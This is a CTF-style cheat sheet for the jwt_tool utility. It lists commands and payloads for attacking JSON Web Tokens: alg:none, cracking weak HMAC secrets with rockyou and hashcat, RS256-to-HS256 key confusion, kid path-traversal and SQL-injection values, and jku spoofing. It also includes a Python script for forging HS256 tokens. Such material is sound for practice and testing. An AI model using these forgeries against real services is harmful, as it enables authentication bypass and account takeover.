---
title: "Tool - jwt_tool"
category: web
subcategory: jwt
type: tool
tags: [jwt-tool, jwt, json-web-token, alg-none, hs256, rs256, key-confusion, kid, jku, jwk, secret-cracking, hashcat-16500, token-forgery, web, auth-bypass]
summary: "Decode, tamper with, crack and forge JSON Web Tokens: alg:none, algorithm confusion, weak HMAC secrets, kid injection and jku/jwk spoofing."
related: [web-triage, hashcat, burpsuite, attack-surface-by-primitive]
---

## What it is

`jwt_tool` is a Python tool for everything JWT: decoding, verifying, tampering, signing, and running the standard attack playbook against a token. In CTF, a token that starts with `eyJ` is an invitation, and this tool covers the whole checklist in one pass.

## Install

```sh
git clone --depth 1 https://github.com/ticarpi/jwt_tool
cd jwt_tool && python3 -m pip install -r requirements.txt
python3 jwt_tool.py -h
# make it convenient
alias jwt_tool='python3 /path/to/jwt_tool/jwt_tool.py'
# pipx also works for some distributions of it
pipx install jwt-tool 2>/dev/null || true
```

## The invocations that matter

```sh
T='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.abc123'

# 1. decode and display the token
python3 jwt_tool.py "$T"

# 2. run every known attack/check against it (the "playbook" scan)
python3 jwt_tool.py "$T" -M pb

# 3. alg:none (and its case variants: none, None, NONE, nOnE)
python3 jwt_tool.py "$T" -X a

# 4. crack a weak HMAC secret with a wordlist
python3 jwt_tool.py "$T" -C -d /usr/share/wordlists/rockyou.txt
# or with hashcat, which is far faster
hashcat -m 16500 -a 0 token.txt /usr/share/wordlists/rockyou.txt

# 5. sign a tampered token once you know the secret
python3 jwt_tool.py "$T" -T -S hs256 -p 'secret'
#   -T opens an interactive editor for the claims

# 6. tamper a specific claim non-interactively
python3 jwt_tool.py "$T" -I -pc user -pv admin -S hs256 -p 'secret'
python3 jwt_tool.py "$T" -I -pc role -pv admin -hc kid -hv '../../dev/null'

# 7. RS256 -> HS256 algorithm confusion (sign with the public key as the HMAC secret)
python3 jwt_tool.py "$T" -X k -pk public.pem

# 8. kid injection: path traversal, SQLi, or command injection in the kid header
python3 jwt_tool.py "$T" -I -hc kid -hv '/dev/null' -S hs256 -p ''
python3 jwt_tool.py "$T" -X i     # injects test payloads into the kid

# 9. jku / x5u spoofing: point the token at a JWKS you host
python3 jwt_tool.py "$T" -X s -ju 'https://your-host/jwks.json'

# 10. verify a token against a key you have
python3 jwt_tool.py "$T" -V -pk public.pem
```

The attack checklist, independent of the tool:

| Attack | Test |
|---|---|
| `alg: none` | set `alg` to `none`/`None`/`NONE`, remove the signature (keep the trailing dot) |
| Empty signature accepted | keep `alg: HS256` but send an empty third segment |
| Weak HMAC secret | crack with rockyou; `secret`, `password`, the app name and the framework default are common |
| RS256 -> HS256 confusion | sign with the server's **public key bytes** as the HMAC key |
| `kid` path traversal | `"kid": "../../../../dev/null"` then sign with an empty key; or `/proc/sys/kernel/randomize_va_space` |
| `kid` SQL injection | `"kid": "x' UNION SELECT 'secret"` |
| `jku` / `x5u` spoofing | point at your own JWKS; check for host allowlist bypasses |
| `jwk` embedded key | embed your own public key in the header and sign with the matching private key |
| Claim tampering | `sub`, `user`, `role`, `admin`, `iss`, `aud`, `scope` |
| Expiry ignored | set `exp` to the past and see if it still works |
| `nbf`/`iat` confusion | future timestamps |
| Token from another user/tenant | reuse across accounts |
| Algorithm downgrade | ES256 -> HS256, PS256 -> HS256 |
| Null-byte / unicode in claims | parser differentials between the verifier and the consumer |

Decoding by hand, which you should be able to do without any tool:
```sh
# header and payload are base64url, unpadded
echo "$T" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
```
```python
import base64, json
def jwt_decode(tok):
    h, p, s = tok.split(".")
    dec = lambda x: json.loads(base64.urlsafe_b64decode(x + "=" * (-len(x) % 4)))
    return dec(h), dec(p), s
```
Forging an HS256 token with a known secret, without any tool:
```python
import base64, hashlib, hmac, json

def b64(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).decode().rstrip("=")

def sign_hs256(header: dict, payload: dict, secret: bytes) -> str:
    h = b64(json.dumps(header, separators=(",", ":")).encode())
    p = b64(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64(sig)}"

if __name__ == "__main__":
    tok = sign_hs256({"alg": "HS256", "typ": "JWT"}, {"user": "admin"}, b"secret")
    print(tok)
```

## Gotchas

- JWT segments are **base64url without padding**. Naive `base64 -d` fails; translate `-_` to `+/` and add `=` padding.
- `alg: none` requires the signature segment to be **empty but the dot present**: `header.payload.`
- For RS256->HS256 confusion, the HMAC key is the **exact bytes of the public key file**, including the PEM header, footer and trailing newline. Whitespace differences make it fail. Try both with and without the trailing newline.
- To get the public key when it is not published: try `/.well-known/jwks.json`, `/jwks`, the TLS certificate, or recover the RSA modulus from two tokens signed with the same key.
- `hashcat -m 16500` wants the **whole token** on one line in the hash file, not just the signature.
- jwt_tool writes a config file on first run and asks about "proof of concept" mode; accept the defaults.
- Modern libraries reject `alg: none` and algorithm confusion by default. In a CTF the vulnerable code is usually a hand-rolled verify - read the source if you have it.
- Changing a claim without re-signing produces an invalid token; every attack either removes the need for a signature or gives you the key.
- Some servers verify the signature but then read claims from an **unverified** decode elsewhere in the code. Test claim tampering even when the signature check looks correct.

## If it fails, use instead

| Situation | Alternative |
|---|---|
| In-browser / Burp workflow | Burp's **JWT Editor** or **JSON Web Tokens** extension |
| Cracking the secret fast | `hashcat -m 16500` |
| Quick decode only | `jwt.io`-style decoders, or the 5-line Python above |
| Scripted forging in an exploit | `pyjwt` (`jwt.encode(payload, key, algorithm=...)`) - but note pyjwt blocks unsafe algs |
| Flask session cookies (not JWT) | `flask-unsign --decode --cookie '...'`, `--unsign --wordlist` |
| Other token formats (Paseto, Branca, Rails, Django) | format-specific tools; the ideas transfer |
| Key recovery from signatures | `rsa_sign2n` (recovers the RSA modulus from two RS256 tokens) |
